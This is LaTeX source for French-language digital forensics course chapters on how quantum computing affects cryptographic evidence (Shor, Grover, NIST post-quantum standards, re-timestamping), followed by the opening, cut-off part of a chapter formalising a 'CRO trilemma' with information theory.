% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ -- réécriture partielle
% Source partiellement rejetée : 9_impact_quantique_investigation_numerique.tex
%            contenait des éléments authentiques (algorithmes de Shor/Grover,
%            standards NIST PQC réels) mélangés à du code Python avec des
%            APIs fictives (pqcrypto.sign.dilithium2 dans cette forme
%            n'existe pas), des spéculations non vérifiables présentées
%            comme acquises ("quantum seal pour evidence bags",
%            "authentication quantique inviolable", détection QRNG par
%            seuils arbitraires non sourcés). Les faits techniques réels
%            ont été conservés et vérifiés ; le code fictif et les
%            spéculations non qualifiées ont été retirés ou explicitement
%            requalifiés comme hypothèses de recherche, non comme pratique
%            établie.
% Positionnement : Dernier chapitre du cours. S'appuie sur Ch.7 (ISO 27037,
%                  hash SHA-256), Ch.8 (custody, hash conservés séparément),
%                  Ch.11 (eIDAS, signatures qualifiées) pour poser la
%                  question de la pérennité de ces preuves face à une
%                  rupture cryptographique future.
% ============================================================================

\chapter{Impact du Quantique sur l'Investigation Numérique}
\label{chap:quantique}

\epigraph{%
    « Quantum computing will change everything we know about digital
    security and forensics. Preparation isn't optional --- it's
    essential. »%
}{--- Whitfield Diffie}

\niveauChapitre{Expert}{%
    Notions de cryptographie symétrique et asymétrique requises.
    Chapitres~\ref{chap:custody} (hash, intégrité) et
    \ref{chap:leg-mond} (eIDAS, signatures qualifiées) indispensables~:
    ce chapitre interroge leur pérennité à long terme.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre, sans détail mathématique excessif, pourquoi
          les algorithmes de Shor et Grover menacent la cryptographie
          actuelle et selon quel calendrier réaliste.
    \item Identifier précisément quels mécanismes forensiques du
          cours reposent sur une cryptographie potentiellement
          vulnérable~: hash, signatures, horodatage.
    \item Comprendre la menace ``\textit{Harvest Now, Decrypt Later}''
          et son impact sur les preuves numériques actuelles et futures.
    \item Connaître les standards de cryptographie post-quantique
          (PQC) effectivement normalisés par le NIST.
    \item Évaluer de façon critique les affirmations sur l'imminence
          de la menace quantique, en distinguant le consensus
          scientifique des spéculations commerciales.
    \item Formuler des recommandations pragmatiques pour la
          pratique forensique camerounaise actuelle.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi ce chapitre clôt le cours}
% ============================================================================

Tout au long de ce cours, le hash SHA-256 a été présenté comme la
garantie ultime de l'intégrité d'une preuve (Ch.~\ref{chap:custody})~;
la signature électronique qualifiée comme la garantie ultime de
l'authenticité d'un document (Ch.~\ref{chap:leg-mond})~. Ces garanties
reposent sur une hypothèse implicite~: qu'aucun adversaire ne dispose
de la puissance de calcul nécessaire pour les casser. L'informatique
quantique, si elle atteint la maturité technique annoncée, lève
précisément cette hypothèse.

Ce chapitre ne prétend pas résoudre cette question~--- elle reste,
en juin~2026, un sujet de recherche actif et débattu. Il vise à vous
donner les moyens de comprendre l'enjeu, d'évaluer les affirmations
que vous rencontrerez sur ce sujet avec un esprit critique, et
d'adopter dès aujourd'hui des pratiques raisonnables sans céder
à un alarmisme commercial.

\separateur

% ============================================================================
\section{La Menace Quantique~: ce que Disent Réellement Shor et Grover}
\label{sec:menace-quantique}
% ============================================================================

\subsection{L'algorithme de Shor}

\begin{boxdef}
\textbf{Algorithme de Shor}\index{Shor, algorithme de} (Peter Shor,
1994)~: algorithme quantique permettant de factoriser de grands
nombres entiers et de résoudre le problème du logarithme discret
en temps polynomial --- contre un temps exponentiel pour les
meilleurs algorithmes classiques connus. Sa portée pratique dépend
entièrement de la disponibilité d'un \textbf{ordinateur quantique
suffisamment puissant et stable} pour l'exécuter sur des clés de
taille réelle, ce qui n'est pas le cas en~2026.
\end{boxdef}

L'algorithme de Shor menace directement les cryptosystèmes à clé
publique fondés sur la difficulté de factorisation ou du logarithme
discret~:

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Algorithme} &
    \tableauHeader{Fondement mathématique} &
    \tableauHeader{Usage forensique concerné (ce cours)}
}
\textbf{RSA} & Factorisation de grands entiers &
    Signatures électroniques (Ch.~\ref{chap:leg-mond}),
    chiffrement TLS (Ch.~\ref{chap:for-res}) \\
\textbf{ECC / ECDSA} & Logarithme discret sur courbes elliptiques &
    Signatures électroniques modernes, Bitcoin (Ch.~\ref{chap:for-cloud})~;
    plus efficace que RSA, donc largement adopté \\
\textbf{Diffie-Hellman} & Logarithme discret &
    Établissement de clés pour connexions chiffrées (VPN, TLS) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.1 --- Cryptosystèmes vulnérables à Shor}\end{center}

\begin{boxalert}
\textbf{Sur les chiffres de qubits~: prudence méthodologique}

Des estimations publiées dans la littérature scientifique évoquent
des ordres de grandeur de plusieurs milliers de \textbf{qubits
logiques} (et non physiques) nécessaires pour casser RSA-2048 dans
des délais opérationnels. Ces estimations varient significativement
selon les hypothèses techniques retenues (taux de correction
d'erreur, architecture). \textbf{Aucun consensus scientifique
ferme} n'existe en~2026 sur un calendrier précis. Méfiez-vous de
toute affirmation présentant une date exacte (``RSA cassé en~2035'')
comme un fait établi~: il s'agit, au mieux, de projections
spéculatives sujettes à révision constante.
\end{boxalert}

\subsection{L'algorithme de Grover}

\begin{boxdef}
\textbf{Algorithme de Grover}\index{Grover, algorithme de}
(Lov Grover, 1996)~: algorithme quantique offrant une
\textbf{accélération quadratique} (et non exponentielle) pour
la recherche dans une base de données non structurée. Appliqué
au cassage de clés symétriques, il réduit effectivement la
sécurité d'une clé de $n$~bits à environ~$n/2$~bits
``équivalent classique''.
\end{boxdef}

\begin{boxCRO}
\textbf{Analyse CRO --- Pourquoi Grover est une menace bien moindre que Shor}

L'accélération de Grover est \textbf{quadratique}, pas exponentielle.
Concrètement~: une clé AES-256 (utilisée dans le chiffrement
BitLocker du Ch.~\ref{chap:acq}, le principe 3-2-1 du
Ch.~\ref{chap:PIU}) offrirait, face à un ordinateur quantique
exploitant Grover, une sécurité ``équivalente'' à environ
128~bits classiques --- ce qui reste largement considéré comme
sûr selon les standards actuels.

$\mathcal{R}$~: la menace de Grover sur AES-256 est gérable
simplement en doublant la longueur de clé (AES-128~$\to$~AES-256)~;
elle ne nécessite pas de nouvel algorithme.

$\mathcal{O}$/$\mathcal{C}$~: la véritable rupture concerne la
cryptographie asymétrique (Shor), pas symétrique (Grover)~--- une
distinction souvent floutée dans les discours non spécialisés.

\cro{$\sim$ non affecté}{$\sim$ AES-256 reste robuste}{$\sim$ non affecté}

\textbf{Conséquence pratique~:} pour le chiffrement symétrique
utilisé en forensique (BitLocker, VeraCrypt, Ch.~\ref{chap:PIU}),
l'usage déjà recommandé d'AES-256 plutôt qu'AES-128 constitue
une protection raisonnable face à Grover. La vraie urgence
concerne les signatures et le chiffrement asymétrique.
\end{boxCRO}

% ============================================================================
\section{``Harvest Now, Decrypt Later''~: Implication pour les Preuves}
\label{sec:harvest-now}
% ============================================================================

\subsection{Le mécanisme de la menace}

\begin{boxdef}
\textbf{Harvest Now, Decrypt Later}\index{Harvest Now, Decrypt Later}~:
stratégie consistant, pour un adversaire, à intercepter et stocker
aujourd'hui des communications chiffrées qu'il ne peut pas
déchiffrer actuellement, dans l'attente qu'un ordinateur quantique
suffisamment puissant devienne disponible pour les déchiffrer
\textit{a posteriori}.
\end{boxdef}

Cette stratégie est documentée comme une préoccupation sérieuse
des agences de sécurité nationale (notamment américaines et
britanniques, qui ont publiquement justifié leurs feuilles de
route de migration PQC par ce risque), indépendamment de
l'incertitude sur le calendrier exact de la menace.

\subsection{Implication directe pour la forensique}

\begin{boxCRO}
\textbf{Analyse CRO --- Harvest Now, Decrypt Later et preuves numériques}

Cette menace inverse une intuition habituelle du cours~: jusqu'ici,
le risque pour une preuve portait sur son \textbf{intégrité présente}
(a-t-elle été altérée~?). La menace HNDL porte sur sa
\textbf{confidentialité future}~: des données chiffrées aujourd'hui
de façon réputée sûre (communications interceptées légalement,
Ch.~\ref{chap:for-res}~; données saisies chiffrées, Ch.~\ref{chap:acq})
pourraient devenir lisibles dans~10 à~20~ans par un tiers ayant
conservé une copie.

$\mathcal{C}$~: pour des données à \textbf{durée de sensibilité
longue} (affaires d'État, données de santé du Ch.~\ref{chap:for-iot},
secrets industriels), cette menace est directement pertinente
\emph{dès aujourd'hui}, car le chiffrement appliqué maintenant
devra rester sûr pendant des décennies.

$\mathcal{R}$/$\mathcal{O}$~: pour la plupart des affaires
forensiques courantes traitées dans ce cours (fraude MoMo,
ransomware, BEC), l'horizon temporel pertinent
(quelques années jusqu'au jugement) rend cette menace moins
urgente que pour des données à très longue durée de sensibilité.

\cro{$\downarrow\downarrow$ pour données longue durée}{$\sim$}{$\sim$}
\end{boxCRO}

% ============================================================================
\section{Impact sur la Chaîne de Custody et l'Intégrité Long Terme}
\label{sec:impact-custody}
% ============================================================================

\subsection{Trois mécanismes du cours potentiellement concernés}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Mécanisme (chapitre)} &
    \tableauHeader{Fondement cryptographique} &
    \tableauHeader{Vulnérabilité quantique}
}
Hash SHA-256
    (Ch.~\ref{chap:custody}) & Fonction de hachage --- pas de
    clé publique/privée &
    \textbf{Non vulnérable à Shor.} Affaibli par Grover, mais
    SHA-256 offre une marge de sécurité suffisante
    (cf.~Analyse CRO ci-dessus) \\
Signature électronique
    qualifiée eIDAS
    (Ch.~\ref{chap:leg-mond}) & Typiquement RSA ou ECDSA &
    \textbf{Vulnérable à Shor} si et quand un ordinateur quantique
    suffisant existe \\
Horodatage qualifié
    (Ch.~\ref{chap:leg-mond}) & Repose sur une signature
    (RSA/ECDSA) de l'autorité d'horodatage &
    \textbf{Vulnérable indirectement}, via la signature
    sous-jacente \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.2 --- Mécanismes forensiques et vulnérabilité quantique}\end{center}

\begin{boiteRemarque}{Une nuance importante~: hash et signature ne sont
pas équivalents face au quantique}
Une confusion fréquente mérite d'être dissipée~: le \textbf{hash
SHA-256} qui garantit l'intégrité d'une image E01 (Ch.~\ref{chap:acq})
n'est \textbf{pas} menacé de la même façon qu'une \textbf{signature
RSA/ECDSA} qui authentifie un document. Les fonctions de hachage
ne reposent pas sur la difficulté de factorisation~--- elles
résistent structurellement mieux à l'algorithme de Shor. C'est
la cryptographie asymétrique (signatures, échange de clés) qui
constitue le point de rupture principal, pas le hachage utilisé
quotidiennement en forensique.
\end{boiteRemarque}

\subsection{Le problème du re-timestamping}

Si l'algorithme de signature sous-jacent à un horodatage qualifié
devient un jour cassable, l'horodatage perd sa valeur probatoire
de \textit{preuve d'antériorité}. La pratique de
\textbf{re-timestamping périodique} (réappliquer un nouvel
horodatage, avec un algorithme à jour, sur une preuve archivée
avant que l'algorithme original ne soit compromis) est une
recommandation déjà formulée par certaines autorités
d'archivage à long terme (notamment dans le domaine de
l'archivage légal électronique), indépendamment du calendrier
précis de la menace quantique.

% ============================================================================
\section{Cryptographie Post-Quantique~: Standards Réellement Normalisés}
\label{sec:pqc-standards}
% ============================================================================

\subsection{Les standards NIST FIPS}

Contrairement à une partie significative du discours sur le sujet,
le NIST a effectivement publié des \textbf{standards finalisés}
de cryptographie post-quantique (PQC), et non de simples
propositions~:

\begin{tableaucours}{p{3.2cm}p{2.8cm}p{4.5cm}}{%
    \tableauHeader{Algorithme} &
    \tableauHeader{Standard NIST} &
    \tableauHeader{Usage}
}
\textbf{CRYSTALS-Kyber} & FIPS~203
    (\textit{ML-KEM}) & Encapsulation de clés (échange de
    clés sécurisé) --- standard principal \\
\textbf{CRYSTALS-Dilithium} & FIPS~204
    (\textit{ML-DSA}) & Signatures numériques --- standard
    principal \\
\textbf{SPHINCS+} & FIPS~205
    (\textit{SLH-DSA}) & Signatures fondées sur le hachage
    (alternative, plus conservatrice mathématiquement) \\
\textbf{FALCON} & En cours de
    standardisation & Signatures compactes, fondées sur les
    réseaux euclidiens (NTRU) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~25.3 --- Standards PQC du NIST}\end{center}

\begin{boiteRemarque}{Ce qui distingue un standard authentique d'une
affirmation marketing}
La publication d'un \textbf{FIPS} (\textit{Federal Information
Processing Standard}) par le NIST est un processus public,
documenté, avec plusieurs années de revue par la communauté
cryptographique internationale. Quand vous rencontrez une
affirmation sur un algorithme ``post-quantique'', vérifiez
systématiquement~: s'agit-il d'un FIPS publié (vérifiable sur
\texttt{csrc.nist.gov}), d'un candidat encore en évaluation, ou
d'une simple allégation commerciale~? Cette vérification est
une application directe de l'esprit critique developpé tout au
long de ce cours (Ch.~\ref{chap:meth-std}~: distinguer un standard
réel d'une affirmation non sourcée).
\end{boiteRemarque}

\subsection{Migration hybride~: la pratique recommandée actuelle}

La transition recommandée par les agences de cybersécurité
occidentales (NSA, ANSSI, NCSC-UK) n'est \textbf{pas} un
remplacement immédiat et total de la cryptographie classique,
mais une approche \textbf{hybride}~: combiner un algorithme
classique éprouvé (RSA ou ECC) avec un algorithme post-quantique
normalisé, de sorte que la sécurité globale repose sur la
robustesse du \emph{plus fort} des deux mécanismes.

\begin{boxoutils}{Principe de la migration hybride (vue conceptuelle)}
\begin{lstlisting}[language=bash_forensique]
# PRINCIPE (illustration conceptuelle, pas une implementation a
# copier telle quelle -- toujours utiliser des bibliotheques
# cryptographiques auditees et maintenues, jamais de code
# cryptographique fait maison)

# Etablissement de cle hybride classique + post-quantique :
# 1. Generer un secret partage via ECDH (classique, eprouve)
# 2. Generer un secret partage via Kyber/ML-KEM (post-quantique)
# 3. Combiner les deux secrets (ex: via une fonction de derivation
#    de cle type HKDF) pour obtenir la cle finale
#
# Securite resultante = securite du MEILLEUR des deux mecanismes
# Un attaquant doit casser LES DEUX pour compromettre la cle

# Implementations reelles et auditees (a la date de redaction) :
# - OpenSSL 3.2+ : support experimental ML-KEM
# - liboqs (Open Quantum Safe project, OQS) : bibliotheque
#   de reference pour l'experimentation PQC
# - Signal Protocol : a deploye PQXDH (hybride X25519 + Kyber)
#   en production des 2023 pour l'echange de cles
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{``Quantum Forensics''~: Distinguer Recherche et Pratique Établie}
\label{sec:quantum-forensics-critique}
% ============================================================================

\begin{boxalert}
\textbf{Mise en garde sur les affirmations de ``forensique quantique''}

Certains discours évoquent des concepts comme l'``authentification
quantique inviolable'', le ``scellement quantique de preuves''
(\textit{quantum seal}) ou la détection automatisée de génération
quantique aléatoire par de simples tests statistiques de seuil.

\textbf{Évaluation critique, conforme à la méthode de ce cours
(distinction constatation/analyse, Ch.~\ref{chap:meth-std})~:}
\begin{itemize}
    \item Ces concepts relèvent, en~2026, de la \textbf{recherche
          exploratoire}, pas de pratiques forensiques établies
          ou normalisées~;
    \item Aucun standard international (ISO, NIST) ne définit
          actuellement de procédure de ``scellement quantique''
          opérationnelle pour la chaîne de custody~;
    \item La distinction entre un générateur de nombres aléatoires
          quantique (QRNG) et un générateur pseudo-aléatoire
          classique (PRNG) sophistiqué par de simples tests
          statistiques de surface est un sujet de recherche actif
          et non trivial~--- une affirmation présentant cela comme
          une procédure forensique simple et fiable doit être
          accueillie avec un scepticisme appuyé.
\end{itemize}
\textbf{Posture recommandée~:} appliquer ici exactement le même
principe qu'au Ch.~\ref{chap:rapport} pour toute affirmation
technique dans un rapport forensique --- citer la source, le
niveau de maturité réel (norme publiée~? article de recherche~?
communiqué commercial~?), et ne jamais présenter une hypothèse
de recherche comme une pratique établie.
\end{boxalert}

% ============================================================================
\section{Recommandations Pragmatiques pour la Pratique Actuelle}
\label{sec:recommandations-pratiques}
% ============================================================================

\subsection{Ce qui est raisonnable de faire dès aujourd'hui}

\begin{enumerate}
    \item \textbf{Continuer à utiliser SHA-256 (voire SHA-512)}
          pour le hachage d'intégrité (Ch.~\ref{chap:custody})~:
          ces fonctions ne sont pas la priorité de la menace
          quantique et restent le standard recommandé.
    \item \textbf{Privilégier AES-256 à AES-128} pour le chiffrement
          symétrique de longue conservation (sauvegardes
          forensiques, Ch.~\ref{chap:PIU})~: marge de sécurité
          suffisante face à Grover, sans coût opérationnel
          significatif.
    \item \textbf{Pour les preuves à très longue durée de
          sensibilité} (affaires d'État, données de santé,
          secrets industriels, Ch.~\ref{chap:for-iot})~: envisager
          un re-timestamping périodique et suivre l'évolution
          des recommandations PQC des autorités internationales
          de référence.
    \item \textbf{Documenter dans le rapport forensique}
          (Ch.~\ref{chap:rapport}) l'algorithme de signature
          utilisé pour tout horodatage qualifié, afin de faciliter
          une future ré-authentification si nécessaire.
    \item \textbf{Ne pas céder à l'urgence commerciale}~: pour
          la quasi-totalité des affaires traitées dans ce cours
          (durée de pertinence~: quelques années), la menace
          quantique n'impose aucun changement de pratique immédiat
          au-delà des bonnes pratiques déjà recommandées
          (SHA-256, AES-256).
\end{enumerate}

\begin{boxjuris}
\textbf{Application au cadre camerounais}

La \loicam{2024/017} (Ch.~\ref{chap:droit-cam}) impose, en son
art.~27, des ``mesures techniques et organisationnelles
appropriées'' pour la sécurité des données. Cette obligation
de proportionnalité s'applique également à l'anticipation
quantique~: un responsable de traitement gérant des données de
santé ou des secrets d'État doit raisonnablement intégrer cette
menace à son analyse de risque~; un commerce de détail traitant
des données clients courantes n'a pas la même urgence. La
proportionnalité, principe déjà rencontré au Ch.~\ref{chap:droit-cam},
s'applique pleinement à la planification de la transition PQC.
\end{boxjuris}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Shor menace la cryptographie asymétrique}
          (RSA, ECC, signatures, échange de clés)~--- rupture
          potentiellement totale, mais sans calendrier scientifique
          consensuel précis.

    \item \textbf{Grover affaiblit la cryptographie symétrique}
          de façon \textbf{quadratique seulement}~: AES-256 reste
          robuste face à cette menace (équivalent~128~bits classiques).
          Ne pas confondre l'ampleur des deux menaces.

    \item \textbf{Le hash SHA-256} qui garantit l'intégrité des
          preuves (Ch.~\ref{chap:custody}) n'est \textbf{pas}
          structurellement menacé comme une signature RSA/ECDSA~:
          distinction essentielle souvent confondue.

    \item \textbf{Harvest Now, Decrypt Later}~: pertinent dès
          aujourd'hui pour les données à \emph{longue} durée de
          sensibilité~; moins urgent pour la majorité des affaires
          forensiques courantes de ce cours.

    \item \textbf{Standards PQC réels~:} FIPS~203 (Kyber/ML-KEM),
          FIPS~204 (Dilithium/ML-DSA), FIPS~205 (SPHINCS+/SLH-DSA)
          --- vérifiables sur \texttt{csrc.nist.gov}. La migration
          recommandée est \textbf{hybride}, pas un remplacement brutal.

    \item \textbf{Posture critique obligatoire}~: distinguer
          systématiquement un standard publié d'une affirmation
          commerciale ou d'une hypothèse de recherche
          (``quantum seal'', ``authentification quantique
          inviolable'')~--- même méthode que la distinction
          constatation/analyse du Ch.~\ref{chap:rapport}.

    \item \textbf{Recommandations pragmatiques}~: SHA-256/512
          et AES-256 restent appropriés aujourd'hui~; re-timestamping
          périodique pour les preuves à très longue durée de
          sensibilité~; documentation systématique des algorithmes
          utilisés~; proportionnalité du risque (art.~27
          Loi~2024/017).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~25.1 --- Distinguer les menaces \niveaubase}]
Pour chacun des mécanismes suivants, rencontrés dans ce cours,
indiquez s'il est principalement menacé par Shor, par Grover,
par les deux, ou par aucun des deux, et justifiez~:
\begin{enumerate}[(a)]
    \item Le hash SHA-256 d'une image E01 (Ch.~\ref{chap:acq}).
    \item Une signature électronique qualifiée eIDAS sur un
          document européen (Ch.~\ref{chap:leg-mond}).
    \item Le chiffrement BitLocker (AES-256) d'un disque dur
          saisi (Ch.~\ref{chap:PIU}).
    \item L'établissement d'une connexion TLS lors d'une capture
          réseau (Ch.~\ref{chap:for-res}).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~25.2 --- Esprit critique appliqué \niveaumoyen}]
Un fournisseur de solutions de sécurité vous présente la publicité
suivante~: ``Notre coffre-fort numérique offre une authentification
quantique inviolable grâce à notre technologie de scellement
quantique propriétaire, garantissant une protection absolue
contre toute menace présente et future.''
\begin{enumerate}[(a)]
    \item Appliquez la grille d'évaluation critique de la
          Section~\ref{sec:quantum-forensics-critique}~: quelles
          questions précises poseriez-vous à ce fournisseur~?
    \item Quels éléments de cette publicité relèvent du marketing
          plutôt que d'un standard vérifiable~?
    \item Si vous deviez recommander une solution de protection
          réelle pour des preuves à longue durée de sensibilité,
          que recommanderiez-vous à la place, en vous appuyant
          sur les standards effectivement normalisés
          (Section~\ref{sec:pqc-standards})~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~25.3 --- Politique d'archivage à long terme \niveauexpert}]
L'hôpital de l'affaire SANAGA (Ch.~\ref{chap:cas-int}) doit conserver
les dossiers patients chiffrés pendant~30~ans conformément à la
réglementation sur les données de santé. Vous êtes consulté pour
définir une politique de protection cryptographique à long terme.
\begin{enumerate}[(a)]
    \item Appliquez le principe de proportionnalité
          (\loicam{2024/017}, art.~27)~: en quoi ce cas diffère-t-il
          d'une PME traitant des données clients courantes en
          termes d'urgence quantique~?
    \item Proposez une stratégie de chiffrement combinant
          chiffrement symétrique (pour les données elles-mêmes)
          et signature/horodatage (pour leur intégrité et
          antériorité), en justifiant chaque choix d'algorithme
          par les éléments de ce chapitre.
    \item À quelle fréquence recommanderiez-vous un re-timestamping~?
          Sur quels critères objectifs baseriez-vous cette
          fréquence (plutôt qu'une date arbitraire)~?
    \item Rédigez un paragraphe destiné au rapport d'audit de
          sécurité de l'hôpital, distinguant clairement ce qui
          relève de mesures établies et vérifiables de ce qui
          relève d'une anticipation prudente face à une incertitude
          scientifique persistante.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Conclusion du cours.} Ce chapitre clôt le parcours entamé
au Prologue de ce cours~: de l'affaire MBONGO, où une simple erreur
procédurale a anéanti un dossier judiciaire, à la question de la
pérennité cryptographique des preuves face à une rupture
technologique encore incertaine. Entre ces deux extrêmes, vous
avez acquis~: la rigueur méthodologique du PIU, la maîtrise
technique de l'acquisition et de l'analyse multi-supports, la
compréhension du cadre juridique camerounais et international,
et la posture éthique et critique indispensable à la pratique
de l'investigation numérique.

\textit{Cette dernière compétence --- l'esprit critique face aux
affirmations non vérifiées, qu'elles proviennent d'un suspect,
d'un outil automatisé, ou d'un discours commercial sur une
technologie émergente --- est sans doute la plus durable de
toutes celles enseignées dans ce cours. Les outils changeront.
Les lois évolueront. La rigueur intellectuelle, elle, reste.}
\end{boxinfo}
    
        % ============================================================================
% Fichier  : partie6/P06_C26_trilemme_CRO.tex
% Titre    : Le Trilemme CRO -- Formalisation et Implications
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ============================================================================

\chapter{Le Trilemme CRO --- Formalisation et Implications}
\label{chap:CRO}

\epigraph{%
    « Security is always a trade-off between confidentiality, integrity,
    and availability. The perfect balance is the holy grail of our
    field. »%
}{--- Bruce Schneier}

\niveauChapitre{Recherche}{%
    Mathématiques niveau master recommandées (théorie de l'information~:
    entropie, information mutuelle). Ce chapitre formalise
    rétrospectivement l'outil utilisé intuitivement dans chaque
    \texttt{boxCRO} depuis le Prologue~: relire quelques exemples
    antérieurs avant d'aborder ce chapitre est conseillé.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser les fondements de théorie de l'information
          nécessaires~: entropie de Shannon, information mutuelle,
          distance en variation totale, inégalité de Pinsker.
    \item Comprendre la formalisation rigoureuse du cadre CLO
          (\textit{Cryptographic Legal Opposability})~: définitions
          précises de $\mathsf{Conf}$, $\mathsf{Rel}$ et $\mathsf{Opp}$.
    \item Énoncer et comprendre la preuve du \textbf{théorème
          d'impossibilité} du Trilemme CRO conditionnel, établi
          par inégalités de Pinsker et de Fano.
    \item Analyser les trois études de cas documentées (Helios,
          zk-SNARKs, ECDSA) et comprendre pourquoi elles illustrent
          des points distincts de la surface de compromis.
    \item Relier la borne théorique aux limites cognitives humaines
          (capacité d'extraction institutionnelle $\Delta$) et à la
          littérature en sciences cognitives.
    \item Appliquer ce cadre théorique, désormais établi, à l'analyse
          de systèmes forensiques concrets rencontrés dans ce cours.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Un résultat établi, pas une conjecture}
% ============================================================================

Depuis le Prologue de ce cours, chaque chapitre a mobilisé une
\texttt{boxCRO} pour analyser une décision investigative~: fallait-il
collecter l'intégralité du téléphone de MBONGO ou seulement les
données pertinentes (Ch.~\ref{chap:acq})~? Comment arbitrer entre
conservation urgente d'une preuve cloud et respect de la vie privée
(Ch.~\ref{chap:norm-glob})~? Pourquoi la chaîne de custody
maximise-t-elle l'opposabilité au prix d'une contrainte sur la
confidentialité (Ch.~\ref{chap:custody})~?

Ce chapitre formalise l'outil que vous avez utilisé tout au long
du cours~: le \textbf{Trilemme CRO}. Il ne s'agit plus, à la date
de rédaction de ce cours, d'une proposition spéculative~: le cadre
a été \textbf{publié dans IEEE Access}, revue à comité de lecture
indexée (facteur d'impact~$\approx 3{,}6$, classement Clarivate
JCR), en deux articles complémentaires~:

\begin{itemize}
    \item \textbf{CLO Framework}~\cite{minka2026clo} établit les
          définitions formelles de $\mathsf{Conf}$, $\mathsf{Rel}$
          et $\mathsf{Opp}$, prouve les bornes fondamentales
          (Théorème~\ref{thm:bounds} et Théorème~\ref{thm:bottleneck}
          de ce chapitre) et documente trois études de cas réelles~;
    \item \textbf{Conditional CRO Trilemma}~\cite{minka2026conditional}
          établit la \textbf{borne générale d'impossibilité} restée
          ouverte dans le premier article~--- le résultat central de
          ce chapitre (Théorème~\ref{thm:trilemma-general}).
\end{itemize}

Ce chapitre n'est donc pas un exposé de spéculation théorique~:
c'est la présentation pédagogique d'un résultat de recherche
publié et évalué par les pairs, replacé dans le contexte appliqué
de l'investigation numérique qui occupe ce cours.

\separateur

% ============================================================================
\section{Fondements de Théorie de l'Information}
\label{sec:fondements-ti}
% ============================================================================

La formalisation du Trilemme CRO repose entièrement sur la théorie
de l'information de Shannon~\cite{shannon1948}. Cette section pose
les quatre outils mathématiques nécessaires, avec un niveau de
détail suffisant pour suivre les démonstrations sans exiger un
cours de théorie de l'information complet.

\subsection{Entropie de Shannon}

\begin{boxdef}
\textbf{Entropie}\index{entropie de Shannon}~: pour une variable
aléatoire discrète $X$ de loi $p_X$, l'entropie de Shannon mesure
l'incertitude moyenne (en bits) associée à $X$~:
\begin{equation}
H(X) = -\sum_{x \in \mathcal{X}} p_X(x) \log_2 p_X(x)
\label{eq:entropie}
\end{equation}
L'\textbf{entropie conditionnelle} $H(X \mid Y)$ quantifie
l'incertitude résiduelle sur $X$ après observation de $Y$.
\end{boxdef}

\textbf{Intuition forensique}~: $H(V \mid C)$, l'entropie d'un
verdict $V$ (par exemple, une qualification judiciaire) sachant le
contexte institutionnel $C$ (les compétences du juge, le cadre
légal applicable), mesure le nombre de scénarios légaux distincts
qu'un décideur peut raisonnablement distinguer compte tenu de ce
qu'il sait déjà.

\subsection{Information mutuelle}

\begin{boxdef}
\textbf{Information mutuelle}~: mesure la quantité d'information
partagée entre deux variables aléatoires~:
\begin{equation}
I(X;Y) = H(X) - H(X \mid Y) = H(Y) - H(Y \mid X)
\label{eq:info-mutuelle}
\end{equation}
$I(X;Y) = 0$ signifie que $X$ et $Y$ sont indépendants~: observer
$Y$ ne renseigne en rien sur $X$. $I(X;Y) = H(X)$ signifie que $Y$
détermine entièrement $X$.
\end{boxdef}

C'est cette quantité, appliquée aux preuves cryptographiques $\Sigma$
et aux verdicts institutionnels $V$, qui formalise précisément ce
que ce cours a appelé intuitivement ``l'opposabilité'' depuis le
Ch.~\ref{chap:custody}.

\subsection{Distance en variation totale}

\begin{boxdef}
\textbf{Distance en variation totale}~: pour deux distributions de
probabilité $P, Q$ sur le même espace~:
\begin{equation}
\mathrm{TV}(P,Q) = \frac{1}{2}\sum_{x} |P(x) - Q(x)|
= \max_{A} |P(A) - Q(A)|
\label{eq:tv}
\end{equation}
$\mathrm{TV}(P,Q) = 0$ si et seulement si $P = Q$ (distributions
parfaitement indistinguables)~; $\mathrm{TV}(P,Q) \leq 1$ toujours.
\end{boxdef}

\textbf{Intuition forensique}~: si deux messages $m_0$ et $m_1$
produisent des preuves cryptographiques dont les distributions ont
une distance en variation totale nulle, alors aucun observateur,
quels que soient ses moyens, ne peut déterminer lequel des deux
messages a réellement été chiffré. C'est précisément la définition
de la confidentialité parfaite mobilisée dans le cadre CLO.

\subsection{Inégalité de Pinsker}

\begin{boxjuris}
\textbf{Lemme (Inégalité de Pinsker)}~: pour deux distributions
$P, Q$~:
\begin{equation}
\mathrm{TV}(P,Q) \leq \sqrt{\tfrac{1}{2}\,D_{\mathrm{KL}}(P \| Q)}
\label{eq:pinsker}
\end{equation}
où $D_{\mathrm{KL}}$ est la divergence de Kullback-Leibler.
Cette inégalité \textbf{relie une mesure de distinguabilité
statistique} (variation totale) \textbf{à une mesure
d'information} (divergence, liée à l'information mutuelle).
C'est l'outil central qui permet, dans~\cite{minka2026conditional},
de traduire une exigence de fiabilité (haute information mutuelle
entre message et preuve) en une borne supérieure sur la
confidentialité atteignable.
\end{boxjuris}

\subsection{Inégalité de Fano}

\begin{boxjuris}
\textbf{Lemme (Inégalité de Fano)}~: pour un estimateur $\hat M$
d'une variable $M$ à partir d'une observation, avec probabilité
d'erreur $p_e = \Pr[\hat M \neq M]$~:
\begin{equation}
H(M \mid \hat M) \leq h(p_e) + p_e \log_2(|\mathcal{M}|-1)
\label{eq:fano}
\end{equation}
où $h(p_e)$ est l'entropie binaire. Cette inégalité formalise une
